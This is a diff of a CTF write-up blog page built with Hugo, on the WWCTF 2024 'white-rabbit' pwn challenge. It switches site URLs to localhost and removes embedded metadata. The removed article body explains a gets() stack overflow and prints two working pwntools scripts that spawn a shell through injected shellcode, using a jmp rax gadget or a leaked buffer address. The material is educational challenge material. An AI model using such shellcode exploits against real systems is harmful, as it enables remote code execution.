@@ -1,26 +1,26 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><meta charset="utf-8">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
+<meta name="robots" content="noindex, nofollow">
 <title>World Wide CTF 2024 - pwn/white-rabbit | CTF Writeups</title>
 <meta name="keywords" content="">
 <meta name="description" content="White Rabbit is a shellcode challenge I created for WWCTF 2024. I will walk you through the intended solution and share an very clever approach discovered by my teammate @Nosimue.
 Overview We are given a binary (white_rabbit) and a remote netcat endpoint. The first step is to analyze the binary&rsquo;s protections useing checksec
 [d@d-20tk001gus challs]$ checksec --file=white_rabbit RELRO STACK CANARY NX PIE RPATH RUNPATH	Symbols	FORTIFY	Fortified	Fortifiable	FILE Partial RELRO No canary found NX disabled PIE enabled No RPATH No RUNPATH 31 Symbols	No	0	2	white_rabbit NX Disabled: Allows execution of injected shellcode.">
 <meta name="author" content="">
-<link rel="canonical" href="https://dfoudeh.github.io/posts/ww-ctf-2024-pwn-whiterabbit/">
+<link rel="canonical" href="http://localhost:1313/posts/ww-ctf-2024-pwn-whiterabbit/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.287d23ee212a39f1ca2dfc362a4cfcc63951b52b214116e1cb5663bb1883333a.css" integrity="sha256-KH0j7iEqOfHKLfw2Kkz8xjlRtSshQRbhy1ZjuxiDMzo=" rel="preload stylesheet" as="style">
-<link rel="icon" href="https://dfoudeh.github.io/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://dfoudeh.github.io/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://dfoudeh.github.io/favicon-32x32.png">
-<link rel="apple-touch-icon" href="https://dfoudeh.github.io/apple-touch-icon.png">
-<link rel="mask-icon" href="https://dfoudeh.github.io/safari-pinned-tab.svg">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://dfoudeh.github.io/posts/ww-ctf-2024-pwn-whiterabbit/">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/ww-ctf-2024-pwn-whiterabbit/">
 <noscript>
     <style>
         #theme-toggle,
@@ -57,71 +57,7 @@ Overview We are given a binary (white_rabbit) and a remote netcat endpoint. The 
         }
 
     </style>
-</noscript><meta property="og:title" content="World Wide CTF 2024 - pwn/white-rabbit" />
-<meta property="og:description" content="White Rabbit is a shellcode challenge I created for WWCTF 2024. I will walk you through the intended solution and share an very clever approach discovered by my teammate @Nosimue.
-Overview We are given a binary (white_rabbit) and a remote netcat endpoint. The first step is to analyze the binary&rsquo;s protections useing checksec
-[d@d-20tk001gus challs]$ checksec --file=white_rabbit RELRO STACK CANARY NX PIE RPATH RUNPATH	Symbols	FORTIFY	Fortified	Fortifiable	FILE Partial RELRO No canary found NX disabled PIE enabled No RPATH No RUNPATH 31 Symbols	No	0	2	white_rabbit NX Disabled: Allows execution of injected shellcode." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://dfoudeh.github.io/posts/ww-ctf-2024-pwn-whiterabbit/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2024-12-01T06:52:21-05:00" />
-<meta property="article:modified_time" content="2024-12-01T06:52:21-05:00" />
-
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="World Wide CTF 2024 - pwn/white-rabbit"/>
-<meta name="twitter:description" content="White Rabbit is a shellcode challenge I created for WWCTF 2024. I will walk you through the intended solution and share an very clever approach discovered by my teammate @Nosimue.
-Overview We are given a binary (white_rabbit) and a remote netcat endpoint. The first step is to analyze the binary&rsquo;s protections useing checksec
-[d@d-20tk001gus challs]$ checksec --file=white_rabbit RELRO STACK CANARY NX PIE RPATH RUNPATH	Symbols	FORTIFY	Fortified	Fortifiable	FILE Partial RELRO No canary found NX disabled PIE enabled No RPATH No RUNPATH 31 Symbols	No	0	2	white_rabbit NX Disabled: Allows execution of injected shellcode."/>
-
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "Posts",
-      "item": "https://dfoudeh.github.io/posts/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "World Wide CTF 2024 - pwn/white-rabbit",
-      "item": "https://dfoudeh.github.io/posts/ww-ctf-2024-pwn-whiterabbit/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "World Wide CTF 2024 - pwn/white-rabbit",
-  "name": "World Wide CTF 2024 - pwn\/white-rabbit",
-  "description": "White Rabbit is a shellcode challenge I created for WWCTF 2024. I will walk you through the intended solution and share an very clever approach discovered by my teammate @Nosimue.\nOverview We are given a binary (white_rabbit) and a remote netcat endpoint. The first step is to analyze the binary\u0026rsquo;s protections useing checksec\n[d@d-20tk001gus challs]$ checksec --file=white_rabbit RELRO STACK CANARY NX PIE RPATH RUNPATH\tSymbols\tFORTIFY\tFortified\tFortifiable\tFILE Partial RELRO No canary found NX disabled PIE enabled No RPATH No RUNPATH 31 Symbols\tNo\t0\t2\twhite_rabbit NX Disabled: Allows execution of injected shellcode.",
-  "keywords": [
-    
-  ],
-  "articleBody": "White Rabbit is a shellcode challenge I created for WWCTF 2024. I will walk you through the intended solution and share an very clever approach discovered by my teammate @Nosimue.\nOverview We are given a binary (white_rabbit) and a remote netcat endpoint. The first step is to analyze the binary’s protections useing checksec\n[d@d-20tk001gus challs]$ checksec --file=white_rabbit RELRO STACK CANARY NX PIE RPATH RUNPATH\tSymbols\tFORTIFY\tFortified\tFortifiable\tFILE Partial RELRO No canary found NX disabled PIE enabled No RPATH No RUNPATH 31 Symbols\tNo\t0\t2\twhite_rabbit NX Disabled: Allows execution of injected shellcode. PIE Enabled: The binary is loaded at a random address in memory. No Canary: The binary does not use stack canaries, which are a protection against buffer overflow attacks. ASLR Enabled: Stack and binary addresses are randomized. Running the program locally:\n(\\_/) ( •_•) / \u003e 0x60f1f6156180 follow the white rabbit... The program prints an address. Disassembling the binary in Ghidra reveals that the printed address is the address of the main function. Here’s a look at main:\nundefined8 main(void) { setvbuf(stdout,(char *)0x0,2,0); setvbuf(stdin,(char *)0x0,2,0); setvbuf(stderr,(char *)0x0,2,0); puts(\"\\n (\\\\_/)\"); puts(\u0026DAT_0010200d); printf(\" / \u003e %p\\n\\n\",main); puts(\"follow the white rabbit...\"); follow(); return 0; } And the follow function:\nvoid follow(void) { char local_78 [112]; gets(local_78); return; } The vulnerability is in follow(), which uses gets() to read user input without bounds, making a buffer overflow possible. Our goal is to inject shellcode into the buffer and execute it. However, since the leaked address is not a stack address, we don’t know where to jump to. We need to find a different way to execute our shellcode,\nAnalyzing Input Let’s take a look at what happens to our input after gets() is called in follow() Attaching a debugger and setting a breakpoint after gets() and sending ‘AAAAAAA’ as input we see:\n$rax : 0x00007fffffffe150 → \"AAAAAAAA\" $rbx : 0x00007fffffffe2f8 → 0x00007fffffffe6c1 → \"/home/d/Downloads/WWCTF24/challs/white_rabbit\" $rcx : 0x00007ffff7f828e0 → 0x00000000fbad208b $rdx : 0x0 $rsp : 0x00007fffffffe150 → \"AAAAAAAA\" $rbp : 0x00007fffffffe1c0 → 0x00007fffffffe1d0 → 0x00007fffffffe270 → 0x00007fffffffe2d0 → 0x0000000000000000 $rsi : 0x00007ffff7f82963 → 0xf84720000000000a (\"\\n\"?) $rdi : 0x00007ffff7f84720 → 0x0000000000000000 $rip : 0x000055555555517d → nop $r8 : 0x0 $r9 : 0x0 $r10 : 0x0 $r11 : 0x246 $r12 : 0x1 $r13 : 0x0 $r14 : 0x00007ffff7ffd000 → 0x00007ffff7ffe2e0 → 0x0000555555554000 → jg 0x555555554047 $r15 : 0x0000555555557dd8 → 0x0000555555555110 → endbr64 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 The input buffer is pointed to by RAX after gets(). This makes sense as RAX is usually used to hold the return value of a functions. This means if we can find a jmp rax or call rax gadget in the binary, we can redirect execution to our shellcode in the buffer.\nFinding Gadgets with Ropper Using ropper, we can search for a gadget to execute our shellcode:\n[d@d-20tk001gus challs]$ ropper --file=white_rabbit --search \"jmp rax\" [INFO] Load gadgets from cache [LOAD] loading... 100% [LOAD] removing double gadgets... 100% [INFO] Searching for gadgets: jmp rax [INFO] File: white_rabbit 0x00000000000010bf: jmp rax; 0x00000000000010bf: jmp rax; nop dword ptr [rax]; ret; 0x0000000000001100: jmp rax; nop word ptr [rax + rax]; ret; The jmp rax gadget at 0x10bf allows us to jump directly to the address stored in RAX — exactly what we need.\nCrafting the exploit: Calculate Base Address: Since PIE is enabled, the binary is loaded at a randomized base address. We use the leaked address of main to compute the base address: elf.address = int(p.recvuntil(\"\\n\").strip(), 16) - elf.sym.main Calculate Overflow Offset: The distance between the start of the buffer and RIP is 120 bytes. Craft our shellcode: We could write our own, but pwncools shellcraft is very convinient :) Finally we build our payload: First our shellcode, then padding to instruction pointer, and then our jmp rax gadget. Here is our final solve script:\nelf = context.binary = ELF('../white_rabbit',) p = remote(\"whiterabbit.chal.wwctf.com\", 1337) jmp_rax = next(elf.search(asm('jmp rax'))) p.recvuntil(\"\u003e\"); elf.address = int(p.recvuntil(\"\\n\").strip(), 16) - elf.sym.main jmp_rax += elf.address payload = asm(shellcraft.sh()) payload = payload.ljust(120, b'A') payload += p64(jmp_rax) p.sendline(payload) p.interactive() wwf{jmp_d0wn_th3_r4bb1t_h0le_0caba44088}\nAlternate Solution: Leaking Buffer Address During internal testing of this challenge, my teammate @Nosiume came up with a very clever solve that bypasses the need for a jmp rax gadget entirely by leaking the address of the buffer. Here’s how it works:\nAfter gets() in the follow() function, the address of the buffer is stored in RAX. By finding a code path that prints the contents of RAX, we can leak the buffer address to bypass ASLR. This instuction within main moves the contents of rax to rsi.\n0x00000000000011d1 \u003c+45\u003e:\tmov rsi,rax\nAt this point:\nrax holds the address of our input buffer. rsi (set by mov rsi, rax) will be passed to printf() as the second argument during a subsequent call. If we redirect execution to this instruction, the buffer address will be printed during the next printf() call. Afterward, the program continues to the follow() function, where we can use the leaked address for a direct return to our shellcode.\nHere is his final solve script.\n#!/usr/bin/env python3 from pwn import * context.log_level = 'error' context.binary = elf = ELF('./white_rabbit') context.terminal = ['alacritty', '-e'] gs = \"\"\" b *follow+26 continue \"\"\" io = gdb.debug(elf.path, gdbscript=gs) if args.GDB else process() def exploit(): context.log_level = 'info' io.recvuntil(b'\u003e ') elf.address = int(io.recvline(), 16) - elf.sym.main info(\"elf base : \" + hex(elf.address)) info(\"target : \" + hex(elf.address + 0x11d1)) offset = 120 payload = b'A'*offset + pack(elf.address + 0x11d1) io.sendlineafter(b'...\\n', payload) io.recvuntil(b'\u003e ') shellcode_addr = int(io.recvline(), 16) payload = flat({ 0: [ asm(shellcraft.amd64.linux.sh()) ], offset: [ shellcode_addr ] }) io.sendlineafter(b'...\\n', payload) io.interactive() if __name__ == \"__main__\": exploit() If you came up with a unique solve or have feedback on the challenge, I’d love to hear from you.\n",
-  "wordCount" : "970",
-  "inLanguage": "en",
-  "datePublished": "2024-12-01T06:52:21-05:00",
-  "dateModified": "2024-12-01T06:52:21-05:00",
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://dfoudeh.github.io/posts/ww-ctf-2024-pwn-whiterabbit/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "CTF Writeups",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://dfoudeh.github.io/favicon.ico"
-    }
-  }
-}
-</script>
+</noscript>
 </head>
 
 <body class="" id="top">
@@ -139,7 +75,7 @@ Overview We are given a binary (white_rabbit) and a remote netcat endpoint. The 
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="https://dfoudeh.github.io/" accesskey="h" title="CTF Writeups (Alt + H)">CTF Writeups</a>
+            <a href="http://localhost:1313/" accesskey="h" title="CTF Writeups (Alt + H)">CTF Writeups</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -161,8 +97,6 @@ Overview We are given a binary (white_rabbit) and a remote netcat endpoint. The 
                         <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                     </svg>
                 </button>
-                <ul class="lang-switch"><li>|</li>
-                </ul>
             </div>
         </div>
         <ul id="menu">
@@ -349,7 +283,7 @@ Overview We are given a binary (white_rabbit) and a remote netcat endpoint. The 
     </main>
     
 <footer class="footer">
-    <span>&copy; 2025 <a href="https://dfoudeh.github.io/">CTF Writeups</a></span>
+    <span>&copy; 2025 <a href="http://localhost:1313/">CTF Writeups</a></span>
     <span>
         Powered by
         <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
